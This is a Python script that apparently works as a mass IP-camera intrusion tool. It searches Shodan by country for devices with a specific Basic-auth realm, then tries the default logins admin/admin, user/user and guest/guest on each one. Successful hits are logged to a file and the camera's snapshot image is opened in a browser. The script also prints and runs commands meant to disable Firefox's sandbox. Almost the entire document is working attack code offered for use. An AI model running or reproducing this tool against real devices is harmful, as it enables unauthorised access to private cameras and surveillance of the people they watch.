import webbrowser
import requests
import shodan
from requests.auth import HTTPBasicAuth
from requests.exceptions import ConnectionError
import webbrowser
import subprocess
import time

print("\033[2;31;40m[!]If Mozilla Sandbox AutoDisable Not Work, use following commands to close Mozilla Sandbox!")
print("[+]export MOZ_DISABLE_CONTENT_SANDBOX=1")
print("[+]export MOZ_DISABLE_GMP_SANDBOX=1")
print("[+]export MOZ_FAKE_NO_SANDBOX=1\n")

country = input("Country: ")
searchlimit = input("Search Limit: ")
API_KEY = "xxxxxxxxxx"
SEARCH_FOR = 'WWW-Authenticate: Basic realm="index.html" country:"'+country+'"'

print("\033[1;34;40m [*]Disabling... Temporarily Mozilla Sandbox!\n")
time.sleep(2)
subprocess.run("export MOZ_DISABLE_CONTENT_SANDBOX=1", shell=True)
subprocess.run("export MOZ_DISABLE_GMP_SANDBOX=1", shell=True)
subprocess.run(" export MOZ_FAKE_NO_SANDBOX=1", shell=True)
print("\033[1;32;40m [*]Mozilla Sandbox Temporarily Disabled!\n")

def test_cam (IP,PORT,CC):
	session = requests.Session()
	print ("[*] Trying "+IP+" Country: "+CC+"")
	if PORT == "80,81,82,83,84,8080,443":
		URL = "https://"+IP+":"+PORT+"/"
	else:
		URL = "http://"+IP+":"+PORT+"/"
	headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
	try:
		response = session.get(URL, headers=headers, auth=HTTPBasicAuth("admin","admin"), timeout=5)
		if "<title></title>" in response.text:
			text_file = open("found.txt", "a")
			text_file.write("http://"+IP+"/web/admin.html -Country "+CC+"@admin/admin""\n")
			text_file.close()
			print ("\033[1;32;40m [*][OK] Default Pass logged. [*]\n")
			webbrowser.open(URL+"tmpfs/snap.jpg?usr=admin&pwd=admin")
		response = session.get(URL, headers=headers, auth=HTTPBasicAuth("user", "user"), timeout=5)
		if "<title></title>" in response.text:
			text_file = open("found.txt", "a")
			text_file.write("http://" + IP + "/web/ptz.html: -Country " + CC + "@user/user""\n")
			text_file.close()
			print("\033[1;32;40m [*] [OK] Default Pass logged.  [*]\n")
			webbrowser.open(URL+"tmpfs/snap.jpg?usr=user&pwd=user")
		response = session.get(URL, headers=headers, auth=HTTPBasicAuth("guest", "guest"), timeout=5)
		if "<title></title>" in response.text:
			text_file = open("found.txt", "a")
			text_file.write("http://" + IP + "/web/ptz.html: -Country " + CC + "@guest/guest""\n")
			text_file.close()
			print("\033[1;32;40m [*] [OK] Default Pass logged.  [*]\n")
			webbrowser.open(URL+"tmpfs/snap.jpg?usr=guest&pwd=guest")

	except Exception as e:

		print ("\033[1;33;40m[*] Nothing Found on IP:"+IP+" [*]\n")


try:
	# Setup the api
	api = shodan.Shodan(API_KEY)

	# Perform the search
	result = api.search(SEARCH_FOR, limit=searchlimit)

	# Loop through the matches and print each IP
	for service in result['matches']:
		IP = service['ip_str']
		CC = service['location']['country_name']
		PORT = str(service['port'])
		test_cam(IP, PORT, CC)

except KeyboardInterrupt:
	print("Ctrl-c pressed ...")
	sys.exit(1)
